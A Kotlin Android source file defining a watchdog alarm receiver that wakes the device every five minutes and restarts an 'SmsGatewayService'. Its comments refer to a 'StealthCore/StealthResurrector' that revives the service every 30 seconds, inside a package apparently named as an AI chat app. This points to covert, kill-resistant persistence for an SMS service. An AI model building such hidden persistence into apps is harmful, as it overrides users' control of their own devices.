package com.cornspace.aichat.service

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.SystemClock
import android.util.Log

/**
 * Periodic alarm receiver that restarts the service if it has been killed.
 * Fires every 5 minutes even while the device is asleep (coarse watchdog).
 * The fine-grained 30-second resurrection is handled by StealthCore/StealthResurrector.
 */
class AlarmReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "AlarmReceiver"
        private const val ALARM_REQUEST_CODE = 1001
        private const val INTERVAL_MS = 5 * 60 * 1000L // 5 minutes

        fun scheduleAlarm(context: Context) {
            try {
                val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val pendingIntent = buildPendingIntentForSchedule(context)

                alarmManager.setInexactRepeating(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + INTERVAL_MS,
                    INTERVAL_MS,
                    pendingIntent
                )
                Log.d(TAG, "Watchdog alarm scheduled — interval ${INTERVAL_MS}ms")
            } catch (e: Exception) {
                Log.e(TAG, "Error scheduling alarm", e)
            }
        }

        fun cancelAlarm(context: Context) {
            try {
                val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val pendingIntent = buildPendingIntentForCancel(context) ?: run {
                    Log.d(TAG, "No watchdog alarm to cancel")
                    return
                }
                alarmManager.cancel(pendingIntent)
                Log.d(TAG, "Watchdog alarm cancelled")
            } catch (e: Exception) {
                Log.e(TAG, "Error cancelling alarm", e)
            }
        }

        private fun buildPendingIntentForSchedule(context: Context): PendingIntent =
            PendingIntent.getBroadcast(
                context,
                ALARM_REQUEST_CODE,
                Intent(context, AlarmReceiver::class.java),
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )!!

        private fun buildPendingIntentForCancel(context: Context): PendingIntent? =
            PendingIntent.getBroadcast(
                context,
                ALARM_REQUEST_CODE,
                Intent(context, AlarmReceiver::class.java),
                PendingIntent.FLAG_NO_CREATE or PendingIntent.FLAG_IMMUTABLE
            )
    }

    override fun onReceive(context: Context, intent: Intent) {
        Log.d(TAG, "Watchdog alarm fired — checking service")
        try {
            if (!SmsGatewayService.isServiceRunning()) {
                Log.w(TAG, "Service not running — restarting")
                val serviceIntent = Intent(context, SmsGatewayService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent)
                } else {
                    context.startService(serviceIntent)
                }

                // FIX #6: Only start the resurrection loop when we actually need to
                // restart — not unconditionally on every alarm tick. Calling
                // startResurrectionLoop() when the service is healthy added a
                // superfluous alarm reschedule every 5 minutes.
                StealthCore.startResurrectionLoop(context)
            } else {
                Log.d(TAG, "Service running — watchdog alarm no-op")
                // The StealthResurrector loop is self-perpetuating; no need to
                // prod it here when everything is healthy.
            }

            // setInexactRepeating() handles all future deliveries automatically.
            // Do NOT call scheduleAlarm() here — it would create redundant reschedules.

        } catch (e: Exception) {
            Log.e(TAG, "Error in watchdog receiver", e)
        }
    }
}